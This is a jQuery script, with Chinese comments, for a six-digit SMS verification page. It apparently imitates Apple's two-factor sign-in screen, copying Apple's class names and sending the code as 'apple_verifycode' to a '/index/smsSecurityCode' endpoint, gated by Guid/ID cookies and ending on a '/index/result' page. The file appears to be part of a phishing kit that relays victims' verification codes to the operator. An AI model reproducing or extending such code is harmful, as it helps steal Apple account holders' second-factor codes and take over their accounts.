// 检查必要的cookie是否存在,如果不存在则重定向到首页
if (!$.cookie('Guid') || !$.cookie('ID') || !$.cookie('Number')) {
    window.location.href = '/index/signin';
}

// 将父窗口滚动到顶部
$(window.parent.document).scrollTop(0);

// 缓存常用DOM元素
const $numberInputs = $('.security-code-container input');
const $errorMessage = $('.form-message');
const $popButton = $('#no-trstd-device-pop');
const $popMenu = $('.other-options-popover-container');
const verifyingCodeText = $('.verifying-code-text');
const $liteThemeOverride = $('.lite-theme-override');
const $button = $('#try-again-link');
const $loadingIcon = $('.loading-icon');
const diffPhone = $('#diff_phone');
const phoneCount = $.cookie('phoneCount');

if (phoneCount > 1) {
    diffPhone.removeClass('hide');
}

// 验证输入框数量
if ($numberInputs.length !== 6) {
    throw new Error('无效表单: 验证码输入框数量不正确');
}

// 显示更多选项菜单
$popButton.on('click', () => $popMenu.removeClass('hide'));

// 点击页面其他地方时隐藏更多选项菜单
$(document).on('click', (e) => {
    if (!$(e.target).closest("#no-trstd-device-pop,.other-options-popover-container").length) {
        $popMenu.addClass('hide');
    }
});

// 重新发送验证码
$('#try-again').on('click', (e) => {
    e.preventDefault();

    // 更新UI状态
    $errorMessage.addClass('hide');
    $button.addClass('hide');

    $popMenu.addClass('hide');
    $popButton.addClass('hide');
    verifyingCodeText.removeClass('hide');
    diffPhone.addClass('hide');

    // 发送AJAX请求重新获取验证码
    $.ajax({
        url: '/index/SendSms',
        dataType: 'json',
        type: 'post',
        contentType: 'application/json',
        data: JSON.stringify({Guid: $.cookie('Guid'), ID: $.cookie('ID')}),
        success: handleSendSmsSuccess,
        error: handleSendSmsError,
        complete: resetUIAfterSendSms
    });
});

// 处理发送验证码成功的回调
function handleSendSmsSuccess(data) {
    if (data && data.code === 302) {
        window.location.href = '/index/signin';
    } else if (data.data?.serviceErrors?.length > 0) {
        $errorMessage.removeClass('hide').text(data.data.serviceErrors[0].message);
    }
    verifyingCodeText.addClass('hide');
    $popButton.removeClass('hide');
}

// 处理发送验证码失败的回调
function handleSendSmsError() {
    $errorMessage.removeClass('hide').text('发送失败,请稍后重试');
    verifyingCodeText.addClass('hide');
    $popButton.removeClass('hide');
}

// 重置UI状态(发送验证码请求完成后)
function resetUIAfterSendSms() {
    $('.loading-icon').addClass('hide');
    $('#try-again-link').removeClass('hide');
    verifyingCodeText.addClass('hide');
    $popButton.removeClass('hide');
    diffPhone.removeClass('hide');
}

// 验证码输入处理
$numberInputs.on('keyup', handleVerificationCodeInput);

// 处理验证码输入
function handleVerificationCodeInput(e) {
    const $input = $(e.target);
    const index = $input.data('index');
    const value = $input.val();

    if (!/^\d$/.test(value)) {
        handleInvalidInput(e, index);
        return;
    }

    updateVerificationState();
    handleInputNavigation(index, value);
}

// 处理无效输入
function handleInvalidInput(e, index) {
    if (e.keyCode === 8) {  // Backspace key
        $numberInputs.val('').first().focus();
    } else {
        $numberInputs.eq(index).val('');
    }
}

// 更新验证状态
function updateVerificationState() {
    if (window.verify) {
        window.verify = false;
        $numberInputs.parent().removeClass('is-error');
        $errorMessage.addClass('hide');
    }
}

// 处理输入导航(自动跳转到下一个输入框)
function handleInputNavigation(index, value) {
    const smsCode = $numberInputs.map((_, el) => el.value).get().join('');

    if (index < 5 && smsCode.length < 6) {
        for (let i = 0; i <= index; i++) {
            if (!$numberInputs[i].value) {
                $numberInputs[index].blur();
                $numberInputs[i].value = value;
                $numberInputs[i + 1].focus();
                $numberInputs[index].value = '';
                return;
            }
        }
        $numberInputs[Number(index) + 1].focus();
    } else if (smsCode.length === 6) {
        submitVerificationCode(smsCode);
    }
}

// 提交验证码
function submitVerificationCode(smsCode) {
    $numberInputs.attr('disabled', 'true');
    verifyingCodeText.removeClass('hide');
    $liteThemeOverride.addClass('hide');

    $.ajax({
        url: '/index/smsSecurityCode',
        dataType: 'json',
        type: 'post',
        contentType: 'application/json',
        data: JSON.stringify({
            'Guid': $.cookie('Guid'),
            'ID': $.cookie('ID'),
            'apple_verifycode': smsCode,
        }),
        success: handleVerificationSuccess,
        error: handleVerificationError
    });
}

// 处理验证成功
function handleVerificationSuccess(data) {
    if (data && data.code === 200) {
        $('.landing__animation', window.parent.document).hide();
        window.location.href = '/index/result';
    } else {
        handleVerificationError();
        if (data.code === 302) {
            $('.landing__animation', window.parent.document).show();
            window.location.href = '/index/signin';
        }
    }
}

// 处理验证错误
function handleVerificationError() {
    $numberInputs.removeAttr('disabled').parent().addClass('is-error').val('');
    setTimeout(() => $numberInputs.first().focus(), 10);
    verifyingCodeText.addClass('hide');
    $liteThemeOverride.removeClass('hide');
    $errorMessage.removeClass('hide');
    window.verify = true;
}

// 初始化:聚焦第一个输入框
$numberInputs.first().focus();
